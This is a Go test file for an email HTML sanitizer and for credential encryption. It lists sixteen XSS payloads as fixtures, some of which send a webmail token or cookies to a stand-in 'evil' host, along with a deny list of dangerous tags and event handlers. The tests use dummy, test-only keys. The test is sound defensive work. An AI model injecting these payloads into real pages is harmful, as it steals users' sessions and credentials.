package main

import "testing"

var attacks = []struct{ name, in string }{
	{"script tag", `<p>hi</p><script>fetch('//evil/'+localStorage.webmail_token)</script>`},
	{"img onerror", `<img src=x onerror="fetch('//evil/'+document.cookie)">`},
	{"svg onload", `<svg/onload=alert(1)>`},
	{"javascript href", `<a href="javascript:alert(1)">click</a>`},
	{"iframe", `<iframe src="https://evil.example/"></iframe>`},
	{"style expression", `<div style="background:url(javascript:alert(1))">x</div>`},
	{"style block", `<style>body{background:url('//evil/beacon')}</style><p>t</p>`},
	{"form phish", `<form action="//evil/"><input name=pw type=password></form>`},
	{"body onload", `<body onload=alert(1)><p>t</p></body>`},
	{"meta refresh", `<meta http-equiv="refresh" content="0;url=//evil/">`},
	{"base tag", `<base href="//evil/">`},
	{"object", `<object data="//evil/x.swf"></object>`},
	{"onmouseover", `<div onmouseover="alert(1)">hover</div>`},
	{"data uri script", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`},
	{"nested obfuscation", `<img src="x" OnErRoR="alert(1)">`},
	{"srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`},
}

func TestSanitizerBlocksXSS(t *testing.T) {
	bad := []string{"<script", "onerror", "onload", "javascript:", "<iframe", "<form",
		"<object", "onmouseover", "<style", "<meta", "<base", "srcdoc"}
	for _, a := range attacks {
		got := sanitizeEmailHTML(a.in)
		for _, b := range bad {
			if containsFold(got, b) {
				t.Errorf("%s: %q survived in %q", a.name, b, got)
			}
		}
	}
}

func TestSanitizerKeepsLegitimateMail(t *testing.T) {
	in := `<div style="color:#333;font-size:14px"><h1>Réservation</h1>` +
		`<p>Bonjour <b>Florence</b>,</p><table border="1"><tr><td>Juillet</td></tr></table>` +
		`<a href="https://lacure.enbauges.fr/devis">Voir le devis</a>` +
		`<img src="https://lacure.enbauges.fr/logo.png" width="100"></div>`
	got := sanitizeEmailHTML(in)
	for _, want := range []string{"Réservation", "Florence", "<table", "Juillet",
		"https://lacure.enbauges.fr/devis", "logo.png", "color:", "<b>"} {
		if !containsFold(got, want) {
			t.Errorf("lost %q from legitimate mail: %q", want, got)
		}
	}
}

func containsFold(h, n string) bool {
	hl, nl := []rune(lower(h)), []rune(lower(n))
	for i := 0; i+len(nl) <= len(hl); i++ {
		ok := true
		for j := range nl {
			if hl[i+j] != nl[j] {
				ok = false
				break
			}
		}
		if ok {
			return true
		}
	}
	return false
}

func lower(s string) string {
	b := []rune(s)
	for i, r := range b {
		if r >= 'A' && r <= 'Z' {
			b[i] = r + 32
		}
	}
	return string(b)
}

func TestCredentialEncryptionRoundTrip(t *testing.T) {
	t.Setenv("CREDENTIALS_KEY", "6f1c4a2b8d3e5f70918273645566778899aabbccddeeff00112233445566778899"[:64])
	// Shaped like a Resend key, but not one — never put a live credential in a test.
	plain := "re_TestOnly_0000000000000000000000"
	sealed, err := encryptSecret(plain)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}
	if !isEncrypted(sealed) {
		t.Fatalf("not marked encrypted: %q", sealed)
	}
	if containsFold(sealed, "re_TestOnly") || containsFold(sealed, plain) {
		t.Fatalf("plaintext leaked into ciphertext: %q", sealed)
	}
	got, err := decryptSecret(sealed)
	if err != nil || got != plain {
		t.Fatalf("round trip failed: %q %v", got, err)
	}
	// same plaintext must not produce the same ciphertext (random nonce)
	again, _ := encryptSecret(plain)
	if again == sealed {
		t.Errorf("ciphertext is deterministic — nonce not random")
	}
}

func TestDecryptWithWrongKeyFails(t *testing.T) {
	t.Setenv("CREDENTIALS_KEY", "6f1c4a2b8d3e5f70918273645566778899aabbccddeeff001122334455667788")
	sealed, err := encryptSecret("whsec_topsecret")
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}
	t.Setenv("CREDENTIALS_KEY", "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff")
	if got, err := decryptSecret(sealed); err == nil {
		t.Errorf("wrong key decrypted anyway: %q", got)
	}
	t.Setenv("CREDENTIALS_KEY", "")
	if _, err := decryptSecret(sealed); err == nil {
		t.Errorf("missing key should be an error, not a silent pass-through")
	}
}

func TestPlaintextValuesStillReadable(t *testing.T) {
	t.Setenv("CREDENTIALS_KEY", "6f1c4a2b8d3e5f70918273645566778899aabbccddeeff001122334455667788")
	got, err := decryptSecret("re_legacy_plaintext")
	if err != nil || got != "re_legacy_plaintext" {
		t.Errorf("legacy plaintext broke: %q %v", got, err)
	}
}
